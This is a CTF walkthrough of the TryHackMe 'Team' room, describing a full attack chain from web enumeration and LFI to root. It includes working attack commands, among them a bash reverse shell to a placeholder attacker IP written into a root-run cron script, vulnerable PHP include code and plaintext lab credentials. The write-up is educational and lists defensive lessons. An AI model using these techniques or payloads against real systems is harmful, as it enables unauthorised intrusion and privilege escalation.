
# TryHackMe – Team Walkthrough

Beginner friendly boot2root machine

Room: https://tryhackme.com/room/teamcw

## ⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution:  https://github.com/garthheff/CTF-Hints/blob/main/Team.md


## Overview

This room chains together several common issues:

- Hidden virtual hosts
- Recursive directory enumeration
- Exposed backup files
- Reused credentials
- FTP pivoting
- Local File Inclusion
- Sensitive key material stored in configuration
- Command injection
- Weak privilege boundaries
- Writable root-owned automation

The final path was:

```text
Recon → fix vhosts → enumerate web content → recover FTP creds from backup file → FTP access → discover dev site and SSH key clue → exploit LFI → recover SSH private key → SSH as dale → abuse sudo to run a vulnerable script as gyles → get reverse shell as gyles → use group-writable root backup script → get reverse shell as root
```

---

## 1. Initial Recon

Start with a full TCP scan and basic service enumeration.

```bash
nmap -p- -sC -sV TARGET_IP
```

Example output:

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-03 09:30 BST
Nmap scan report for TARGET_IP
Host is up (0.00016s latency).
Not shown: 65532 filtered ports

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux
```

### Analysis

At this point there is nothing obviously exploitable by version alone.

Interesting points:

- **FTP** is exposed and may allow file access or credential reuse
- **SSH** is probably useful later once credentials or a key are found
- **HTTP** is the most likely initial attack surface
- The HTTP site is just the default Apache page, which often means there is hidden content behind a virtual host or subdirectory

---

## 2. Fix Access to the Main Site

This was one of the biggest blockers in the room.

The challenge does **not** clearly tell you that the site uses virtual hosts. If you browse directly by IP, you just get the Apache default page and can waste a lot of time.

Add the main host entry first:

```bash
echo "TARGET_IP team.thm" | sudo tee -a /etc/hosts
```

### Why this mattered

Without adding `team.thm` to `/etc/hosts`:

- Gobuster against the intended virtual host would not behave as expected
- The correct site content would not be served
- Key paths such as `/scripts` were easy to miss

This was probably the hardest early hurdle in the room because nothing in the task flow clearly called it out.

---

## 3. Enumerate the Main Web Site

Now enumerate the main site properly.

```bash
gobuster dir -u http://team.thm/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,old,bak
```

Actual style of output used:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,old,bak,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htaccess.old        (Status: 403) [Size: 273]
/.htpasswd.php        (Status: 403) [Size: 273]
/.htpasswd.txt        (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htaccess.php        (Status: 403) [Size: 273]
/.htaccess.bak        (Status: 403) [Size: 273]
/.htpasswd.bak        (Status: 403) [Size: 273]
/.htpasswd.old        (Status: 403) [Size: 273]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/robots.txt           (Status: 200) [Size: 5]
/robots.txt           (Status: 200) [Size: 5]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/server-status        (Status: 403) [Size: 273]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

### Analysis

The important discovery here is:

```text
/scripts
```

This was **not** a single-step find. It was just the first layer.

---

## 4. Recursively Enumerate `/scripts`

After finding `/scripts`, enumerate it separately.

```bash
gobuster dir -u http://team.thm/scripts -w /usr/share/wordlists/dirb/big.txt -x php,txt,old,bak
```

Actual output:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/scripts
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,php,txt,old
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 273]
/.htaccess.bak        (Status: 403) [Size: 273]
/.htaccess.php        (Status: 403) [Size: 273]
/.htaccess.txt        (Status: 403) [Size: 273]
/.htaccess.old        (Status: 403) [Size: 273]
/.htpasswd.php        (Status: 403) [Size: 273]
/.htpasswd.bak        (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htpasswd.old        (Status: 403) [Size: 273]
/.htpasswd.txt        (Status: 403) [Size: 273]
/script.old           (Status: 200) [Size: 466]
/script.txt           (Status: 200) [Size: 597]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

### Analysis

This is important for the write-up because the room did **not** hand over the credential file directly.

It took:

1. Correct host resolution for `team.thm`
2. One Gobuster pass to find `/scripts`
3. A second Gobuster pass against `/scripts`
4. Inclusion of backup-related extensions such as `.old`

This is a good example of why recursive enumeration matters.

---

## 5. Recover FTP Credentials from `script.old`

Visit:

```text
http://team.thm/scripts/script.old
```

Relevant contents:

```bash
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

### Analysis

This old script exposes credentials in plaintext:

- **Username:** `ftpuser`
- **Password:** `T3@m$h@r3`

It is also a nice example of a common mistake:

- Old script renamed instead of deleted
- Sensitive credentials left in a web-accessible backup file

---

## 6. Use the FTP Credentials

Connect to FTP:

```bash
ftp TARGET_IP
```

Login with:

```text
Name: ftpuser
Password: T3@m$h@r3
```

Once connected, enumerate the available files.

A key file found through FTP was:

```text
New_site.txt
```

---

## 7. Read `New_site.txt`

This was one of the most important pivot points in the room.

Full contents:

```text
Dale
    I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
```

### Why this note matters

This tells us two critical things:

1. There is a **development site** under `.dev`
2. A private SSH key, specifically **`id_rsa`**, has been copied into a configuration file

This note is what turned the approach from broad enumeration into targeted file discovery.

---

## 8. Add the Dev Virtual Host

At this point we now know the dev subdomain exists, so add it.

```bash
echo "TARGET_IP dev.team.thm" | sudo tee -a /etc/hosts
```

Then browse to:

```text
http://dev.team.thm
```

---

## 9. Identify the LFI

The development site presented a placeholder page and a link like:

```text
http://dev.team.thm/script.php?page=teamshare.php
```

The visible page content was:

```text
Site is being built

Place holder link to team share
```

That `page=` parameter is immediately interesting.

To test Local File Inclusion, request:

```text
http://dev.team.thm/script.php?page=/etc/passwd
```

This returned `/etc/passwd`, confirming file inclusion.

### Additional code confirmation

Once source behavior was understood, the vulnerable code was effectively:

```php
<?php
$file = $_GET['page'];
if (isset($file))
{
    include("$file");
}
else
{
    include("teamshare.php");
}
?>
```

### Analysis

This is a very straightforward LFI:

- No sanitisation
- No extension enforcement
- No path restriction
- Arbitrary local file inclusion

---

## 10. Use LFI for Targeted File Enumeration

At this point, broad guessing is possible, but the note from `New_site.txt` makes the next target much more focused.

We know we want:

- A **config file**
- Containing a copied **`id_rsa`**

Useful files discovered during enumeration included:

- Apache virtual host configs
- FTP config
- User home files
- SSH-related files
- Backup scripts and notes

Examples of useful reads during investigation included:

```text
http://dev.team.thm/script.php?page=/etc/passwd
http://dev.team.thm/script.php?page=/etc/apache2/sites-enabled/team.thm.conf
http://dev.team.thm/script.php?page=/etc/apache2/apache2.conf
http://dev.team.thm/script.php?page=/etc/vsftpd.conf
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```

Eventually, the SSH private key material was found embedded in configuration content instead of living in the usual `~/.ssh/id_rsa` location.

This aligns directly with the note telling staff to copy `id_rsa` into a config file.

---

## 11. Recover and Clean the SSH Private Key

Once the key material is extracted, clean it up:

- Remove leading `#` characters if present
- Remove labels or stray text such as usernames
- Keep only the key block

It should look like:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

Save it locally:

```bash
nano id_rsa
chmod 600 id_rsa
```

### Why the cleanup was needed

The extracted key was not presented cleanly. It needed formatting fixes before OpenSSH would accept it.

---

## 12. SSH In as `dale` and cat user flag

With the cleaned key:

```bash
ssh -i id_rsa dale@TARGET_IP
```


---

## 13. Check Dale’s Sudo Rights

Run:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for dale on ip-10-49-137-136:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on ip-10-49-137-136:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

### Analysis

This is the next privilege escalation path:

- `dale` can run `/home/gyles/admin_checks`
- It runs as `gyles`
- No password is needed

---

## 14. Review `/home/gyles/admin_checks`

Read the script:

```bash
cat /home/gyles/admin_checks
```

Contents:

```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

### Why this is vulnerable

This line is the issue:

```bash
$error 2>/dev/null
```

The script asks for input supposedly expecting `date`, but instead of validating the string, it **executes whatever the user enters as a command**.

That means this is command injection by direct command execution.

---

## 15. Exploit the Command Injection to Become `gyles`

Run the vulnerable script as `gyles`:

```bash
sudo -u gyles /home/gyles/admin_checks
```

Example interaction:

```text
Reading stats.
Reading stats..
Enter name of person backing up the data: root
Enter 'date' to timestamp the file: /bin/bash
The Date is /bin/bash
```

At that point, the injected command spawns a shell in the context of `gyles`.

Verify it worked:

```bash
whoami
```

Expected result:

```text
gyles
```

### Why `/bin/bash` worked

The vulnerable line in the script is:

```bash
$error 2>/dev/null
```

So instead of entering the expected `date`, we can provide any executable command. Supplying `/bin/bash` causes the script to launch a shell as the user the script is running as, which in this case is `gyles`.


---

## 16. Stabilise the `gyles` Shell

After spawning the local shell as `gyles`, stabilise it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

If needed, you can also use the usual TTY upgrade flow from your local terminal.

---

## 17. Enumerate as `gyles`

Check the current user and groups:

```bash
id
```

Output:

```text
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

### Key point

`gyles` is in the **admin** group.

That becomes critical later.

---

## 18. Review `gyles` Bash History

This was useful for understanding operational context and likely privilege escalation paths.

Read it:

```bash
cat ~/.bash_history
```

Important observations from the history included references to:

```text
cat /usr/local/bin/main_backup.sh
cat /usr/local/sbin/dev_backup.sh
cat /opt/admin_stuff/script.sh
cat /etc/crontab
sudo nano /usr/local/bin/main_backup.sh
sudo chmod +x /usr/local/bin/main_backup.sh
sudo chown :admin main_backup.sh
sudo chmod 775 main_backup.sh
```

### Analysis

This tells us several useful things:

- Backup scripts are important
- There was repeated interaction with them
- `main_backup.sh` had its group changed to `admin`
- Permissions were modified to make it writable by that group
- `gyles` being in the `admin` group is therefore highly significant

It also pointed us toward cron and automation as the likely execution mechanism for the backup scripts.

---

## 19. Check Cron and Backup Behavior

Read the system crontab:

```bash
cat /etc/crontab
```

Relevant content:

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
25 6  * * * root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7 root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

### Important note

We did **not** see a line directly naming `main_backup.sh` in `/etc/crontab`.

However, combining:

- the backup script names
- the history references
- the fact that root automation was clearly involved
- the later successful root access

strongly indicated that one of the backup scripts was being executed by a privileged automation path.

For the purposes of the room, that was enough to proceed.

---

## 20. Inspect the Root-Owned Backup Script

Read the script:

```bash
cat /usr/local/bin/main_backup.sh
```

Contents:

```bash
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

Check permissions:

```bash
ls -la /usr/local/bin/main_backup.sh
```

Output:

```text
-rwxrwxr-x 1 root admin 118 Apr  3 11:11 /usr/local/bin/main_backup.sh
```

### Why this is critical

This means:

- Owner: `root`
- Group: `admin`
- Group permissions: writable
- Current user `gyles` is in `admin`

So `gyles` can directly modify a script owned by root.

This is the cleanest privilege escalation in the room.

---

## 21. Exploit the Writable Root Script with a Reverse Shell

Set up another listener on your attacking machine:

```bash
nc -lvnp 4444
```

Overwrite the script contents with a reverse shell payload:

```bash
cat > /usr/local/bin/main_backup.sh << 'EOF'
#!/bin/bash
bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
EOF
chmod +x /usr/local/bin/main_backup.sh
```

### Why this works

When the root automation eventually runs `main_backup.sh`, it will execute your payload as **root**, and connect back to your listener.

---

## 22. Receive the Root Shell

Wait for the privileged process to execute the script.

When the reverse shell lands, verify:

```bash
whoami
id
```

Expected result:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

---

## 23. Read the Root Flag

Finally:

```bash
cat /root/root.txt
```

Flag:

```text
THM{cccccccccccccccccccccccccccccccccc}
```

---

## Attack Chain Summary

```text
1. Scan the box with Nmap
2. Add team.thm to /etc/hosts
3. Enumerate team.thm with Gobuster
4. Find /scripts
5. Enumerate /scripts with Gobuster
6. Find script.old
7. Recover FTP credentials from script.old
8. Log in to FTP
9. Read New_site.txt
10. Learn about the dev subdomain and copied id_rsa
11. Add dev.team.thm to /etc/hosts
12. Visit dev site
13. Confirm LFI with /etc/passwd
14. Use LFI to enumerate config files
15. Recover embedded SSH private key
16. SSH in as dale
17. Check sudo rights
18. Run admin_checks as gyles
19. Exploit command injection to get a reverse shell as gyles
20. Read gyles history and inspect backup automation
21. Find writable root-owned script /usr/local/bin/main_backup.sh
22. Overwrite it with a reverse shell
23. Wait for execution and receive a root shell
24. Read /root/root.txt
```

---

## Key Lessons

- Hidden virtual hosts can be the main blocker in a room
- Recursive enumeration is often necessary
- Backup files such as `.old` should always be checked
- Internal notes can provide highly actionable clues
- LFI becomes much more powerful when paired with context from discovered files
- Never store sensitive credentials or private keys in web-accessible files or configs
- Never execute unsanitised user input as a command
- Never allow privileged scripts to be writable by broad groups

---

## Final Notes

This room was a good example of chaining medium-severity issues into full compromise:

- One issue alone was not enough
- Each weakness fed the next
- The room rewarded methodical enumeration more than exploit memorisation

The biggest non-technical hurdle was identifying that the box relied on hostnames which were not clearly stated in the challenge. Once `team.thm` and later `dev.team.thm` were added correctly, the rest of the chain became much more coherent.
